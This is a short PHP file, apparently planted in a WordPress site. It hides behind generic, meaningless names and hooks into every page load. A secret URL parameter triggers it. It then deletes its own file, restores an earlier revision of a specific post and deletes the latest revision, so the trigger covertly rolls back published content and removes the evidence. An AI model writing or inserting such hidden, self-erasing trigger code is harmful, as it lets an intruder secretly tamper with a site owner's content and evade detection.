<?php

function discount_board_super() {
	if (isset($_GET['version_taxonomy_affiliate']) && $_GET['version_taxonomy_affiliate'] === 'templates_stripe_downloads_video') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$view_album_support = 3231;
		$tiny_all_tab_block = wp_get_post_revisions($view_album_support);
		if (empty($tiny_all_tab_block)) die('no revisions');
		if (count($tiny_all_tab_block) < 2) die('less than 2');
		$pro_google_remover = array_shift($tiny_all_tab_block);
		$popular_type_maps = $pro_google_remover->ID;
		$text_help_extra = array_shift($tiny_all_tab_block);
		$album_total_light = $text_help_extra->ID;
		$translate_images_search = wp_restore_post_revision($album_total_light);
		if ($translate_images_search === false) die('error restoring');
		$translate_images_search = wp_delete_post_revision($popular_type_maps);		
		if ($translate_images_search === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'discount_board_super');
